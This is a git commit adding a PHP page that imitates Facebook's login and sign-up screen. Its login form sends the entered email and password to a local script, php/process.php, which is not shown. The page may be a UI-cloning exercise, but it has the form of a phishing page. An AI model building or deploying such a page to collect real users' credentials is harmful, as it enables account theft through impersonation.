e4fd016578201acd5feb603649f103c0da5aa14b
raymondpab <75083563+raymondpab@users.noreply.github.com>
2020-12-10 20:44:14 +0800

    Add files via upload

---
+++ facebook.php
@@ -0,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+	
+	<title>Facebook</title>
+	<head>
+		<link rel="shortcut icon" type="inage/x-icon" href="images.png">
+		<link type="text/css" rel="stylesheet" href="style.css"/>
+	</head>
+	<body>
+
+		<div class="fb-header-base">
+		<div class="fb-header">
+			<div id="img1" class="fb-header"><img src="fb.jpeg"/></div>
+			<form action="php/process.php" method="POST">
+				<div id="form1" class="fb-header">Email or Phone<br>
+					<input  type="email" required="" name="uEmail"/><br>
+
+
+					
+				</div>
+				
+				<div id="form2" class="fb-header">Password<br>
+					<input type="password" required="" name="uPassword"/><br>
+					Forgot account?
+				</div>
+				<input type="submit" class="submit1" value="Log In" name="loginButton" />
+			</form>
+			</div>
+		</div>
+
+		<div class="fb-body">
+			<div id="intro1" class="fb-body">Connect with friends and the <br>world around you on Facebook.</strong></div>
+			<div id="intro2" class="fb-body">Sign Up</div>
+ 			<div id="img2" class="fb-body"><img src="see.jpg" /></div>
+			<div id="intro3" class="fb-body">It's quickly and easy.</div>
+			<div id="form3" class="fb-body">
+		
+			<div style="width:200px; display: inline-block; ">
+						
+			<input placeholder="First Name" type="text" class="namebox" name="first_name" />
+					</div>
+			<div style="width:190px; display: inline-block; ">			
+			<input placeholder="Last Name" type="text" class="namebox" name="last_name" />
+						</div> <br>		
+			<input placeholder="Mobile number or email" type="text" id="mailbox" name="email_phone" /><br>	
+					<input placeholder="New password" type="password" id="mailbox"  name="password" /><br>
+					<label id="intro5">Birthday</label><br>		
+						
+						<tr>
+							<td>
+							<div id=>
+								<select name="day" required>
+									<option value="Day">Day</option>
+									<option value="1">1</option>
+									<option value="2">2</option>
+									<option value="3">3</option>
+									<option value="4">4</option>
+									<option value="5">5</option>
+									<option value="6">6</option>
+									<option value="7">7</option>
+									<option value="8">8</option>
+									<option value="9">9</option>
+									<option value="10">10</option>
+									<option value="11">11</option>
+									<option value="12">12</option>
+									<option value="13">13</option>
+									<option value="14">14</option>
+									<option value="15">15</option>
+									<option value="16">16</option>
+									<option value="17">17</option>
+									<option value="18">18</option>
+									<option value="19">19</option>
+									<option value="20">20</option>
+									<option value="21">21</option>
+									<option value="22">22</option>
+									<option value="23">23</option>
+									<option value="24">24</option>
+									<option value="25">25</option>
+									<option value="26">26</option>
+									<option value="27">27</option>
+									<option value="28">28</option>
+									<option value="29">29</option>
+									<option value="30">30</option>
+									<option value="31">31</option>
+									<option value=""></option>
+									
+								</select>
+							</td>
+
+							<td>
+							<div id=bday2>
+								<select name="year" required>
+									<option value="Year">Year</option>
+									<option value="2020">2020</option>
+									<option value="2019">2019</option>
+									<option value="2018">2018</option>
+									<option value="2017">2017</option>
+									<option value="2016">2016</option>
+									<option value="2015">2015</option>
+									<option value="2014">2014</option>
+									<option value="2013">2013</option>
+									<option value="2012">2012</option>
+									<option value="2011">2011</option>
+									<option value="2010">2010</option>
+									<option value="2009">2009</option>
+									<option value="2008">2008</option>
+									<option value="2007">2007</option>
+									<option value="2006">2006</option>
+									<option value="2005">2005</option>
+									<option value="2004">2004</option>
+									<option value="2003">2003</option>
+									<option value="1971">2002</option>
+									<option value="2001">2001</option>
+									<option value="2000">2000</option>
+									<option value="1999">1999</option>
+									<option value="1998">1998</option>
+									<option value="1997">1997</option>
+									<option value="1996">1996</option>
+									<option value="1995">1995</option>
+									<option value="1994">1994</option>
+									<option value="1993">1993</option>
+									<option value="1992">1992</option>
+									<option value="1991">1991</option>
+									<option value="1990">1990</option>
+									<option value="1989">1989</option>
+									<option value="1988">1988</option>
+									<option value="1987">1987</option>
+									<option value="1986">1986</option>
+									<option value="1985">1985</option>
+									<option value="1984">1984</option>
+									<option value="1983">1983</option>
+									<option value="1982">1982</option>
+									<option value="1981">1981</option>
+									<option value="1980">1980</option>
+									<option value="1979">1979</option>
+									<option value="1978">1978</option>
+									<option value="1977">1977</option>
+									<option value="1976">1976</option>
+									<option value="1975">1975</option>
+									<option value="1974">1974</option>
+									<option value="1973">1973</option>
+									<option value="1972">1972</option>
+									<option value="1971">1971</option>
+									<option value="1970">1970</option>
+									<option value="1969">1969</option>
+									<option value="1968">1968</option>
+									<option value="1967">1967</option>
+									<option value="1966">1966</option>
+									<option value="1965">1965</option>
+									<option value="1964">1964</option>
+									<option value="1963">1963</option>
+									<option value="1962">1962</option>
+									<option value="1961">1961</option>
+									<option value="1960">1960</option>
+									<option value="1959">1959</option>
+									<option value="1958">1958</option>
+									<option value="1957">1957</option>
+									<option value="1956">1956</option>
+									<option value="1955">1955</option>
+									<option value="1954">1954</option>
+									<option value="1953">1953</option>
+									<option value="1952">1952</option>
+									<option value="1951">1951</option>
+									<option value="1950">1950</option>
+									<option value="1949">1949</option>
+									<option value="1948">1948</option>
+									<option value="1947">1947</option>
+									<option value="1946">1946</option>
+									<option value="1945">1945</option>
+									<option value="1944">1944</option>
+									<option value="1943">1943</option>
+									<option value="1942">1942</option>
+									<option value="1941">1941</option>
+									<option value="1940">1940</option>
+									<option value="1939">1939</option>
+									<option value="1938">1938</option>
+									<option value="1937">1937</option>
+									<option value="1936">1936</option>
+									<option value="1935">1935</option>
+									<option value="1934">1934</option>
+									<option value="1933">1933</option>
+									<option value="1932">1932</option>
+									<option value="1931">1931</option>
+									<option value="1930">1930</option>
+									<option value="1929">1929</option>
+									<option value="1928">1928</option>
+									<option value="1927">1927</option>
+									<option value="1926">1926</option>
+									<option value="1925">1925</option>
+									<option value="1924">1924</option>
+									<option value="1923">1923</option>
+									<option value="1922">1922</option>
+									<option value="1921">1921</option>
+									<option value="1920">1920</option>
+									<option value="1919">1919</option>
+									<option value="1918">1918</option>
+									<option value="1917">1917</option>
+									<option value="1916">1916</option>
+									<option value="1915">1915</option>
+									<option value="1914">1914</option>
+									<option value="1913">1913</option>
+									<option value="1912">1912</option>
+									<option value="1911">1911</option>
+									<option value="1910">1910</option>
+									<option value="1909">1909</option>
+									<option value="1908">1908</option>
+									<option value="1907">1907</option>
+									<option value="1906">1906</option>
+									<option value="1905">1905</option>
+									<option value=""></option>
+									
+								</select>
+							</div>
+						</td>
+
+						<td>
+						<div id="bday3">
+							<select name="month" required>
+								<option value="">Month</option>
+									<option value="January">Jan</option>
+									<option value="February">Feb</option>
+									<option value="March">Mar</option>
+									<option value="April">Apr</option>
+									<option value="May">May</option>
+									<option value="June">June</option>
+									<option value="July">July</option>
+									<option value="August">Aug</option>
+									<option value="September">Sep</option>
+									<option value="October">Oct</option>
+									<option value="November">Nov</option>
+									<option value="December">Dec</option>
+									<option value=""></option>
+									
+								</select>
+							</div>
+						</td>
+					</tr>		
+		</div></td></tr><br>		
+						
+				
+			<label id="intro5">Gender</label><br>
+					<input type="radio" id="r-b" name="gender" value="female" />Female
+					<input type="radio" id="r-b" name="gender" value="male" />Male
+					<input type="radio" id="r-b" name="gender" value="custom" />Custom
+					<br><br>
+		
+					<p id="intro4">By clicking Sign Up, you agree to our <a href="#">Terms, Data Policy</a><br>
+						<a href="#"> Coockies Plicy</a>. You may recieve SMS Notifications from us and <br> can opt out any time.</p>
+
+					<input type="submit" class="button2" value="Sign Up" name="signUpBtn" />
+					<br><br>
+				</form>
+				
+				
+			</div>
+			
+		</div>
+	</body>
+</html>
+
+
